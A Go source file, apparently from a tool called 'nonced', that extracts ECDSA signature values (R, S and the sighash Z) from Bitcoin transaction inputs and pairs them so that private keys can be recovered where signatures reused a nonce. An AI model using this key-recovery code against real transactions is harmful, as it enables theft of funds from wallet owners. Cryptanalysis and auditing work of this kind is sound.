package sighash

import (
	"bytes"
	"github.com/btcsuite/btcd/btcec"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcutil"
	"github.com/canselcik/nonced/internal/provider"
	"github.com/piotrnar/gocoin/lib/btc"
	"log"
)

type SHPairBucket struct {
	Pairs 		 []*SHPair
	infoProvider provider.DataProvider
}

func NewSHPairBucket(infoProvider provider.DataProvider) *SHPairBucket {
	return &SHPairBucket{
		Pairs: make([]*SHPair, 0),
		infoProvider: infoProvider,
	}
}

func (bucket *SHPairBucket) Add(rawTxn []byte) int {
	gtx, _ := btc.NewTx(rawTxn)
	gtx.SetHash(rawTxn)

	extracted := 0
	btx, err := btcutil.NewTxFromReader(bytes.NewReader(rawTxn))
	if err != nil {
		log.Println("error in DecodeTransaction:", err.Error())
		return extracted
	}

	msgTx := btx.MsgTx()
	for i, input := range gtx.TxIn {
		sig, key, err := input.GetKeyAndSig()
		if err != nil {
			log.Printf("Error in DeriveEcdsaInfo in (tx=%s, input=%d)\n", btx.Hash().String(), i)
			continue
		}

		res := SHPair{
			PublicKey: key.Bytes(false),
			R:         sig.R,
			S:         sig.S,
		}

		prevOutpoint := msgTx.TxIn[i].PreviousOutPoint
		prevTx := bucket.infoProvider.GetTransaction(&prevOutpoint.Hash)
		if prevTx == nil {
			log.Printf("Error in DeriveEcdsaInfo due to prevtx not found (tx=%s, input=%d)\n",
				btx.Hash().String(), i)
			continue
		}

		// TODO: Perhaps it may be not SigHashAll at all times?
		z, err := txscript.CalcSignatureHash(
			prevTx.MsgTx().TxOut[prevOutpoint.Index].PkScript,
			txscript.SigHashAll,
			msgTx,
			i,
		)
		if err != nil {
			log.Printf(
				"Error in DeriveEcdsaInfo while computing z value from prevOutpoint (tx=%s, outidx=%d)\n",
				prevOutpoint.Hash.String(), prevOutpoint.Index)
			continue
		}
		res.Z = z
		bucket.Pairs = append(bucket.Pairs, &res)
		extracted++
	}
	return extracted
}

func (bucket *SHPairBucket) Solve() []*btcec.PrivateKey {
	if len(bucket.Pairs) < 2 {
		log.Println("Solve() needs at least two SHPair in SHPairBucket")
		return nil
	}

	recovered := make([]*btcec.PrivateKey, 0)
	for i := 0; i < len(bucket.Pairs) - 1; i++ {
		lhs := bucket.Pairs[i]
		for _, rhs := range bucket.Pairs[i+1:] {
			rec, err := lhs.RecoverPrivateKey(rhs)
			if err != nil {
				log.Println("Error in Solve():", err.Error())
			}
			if rec != nil {
				recovered = append(recovered, rec)
			}
		}
	}
	return recovered
}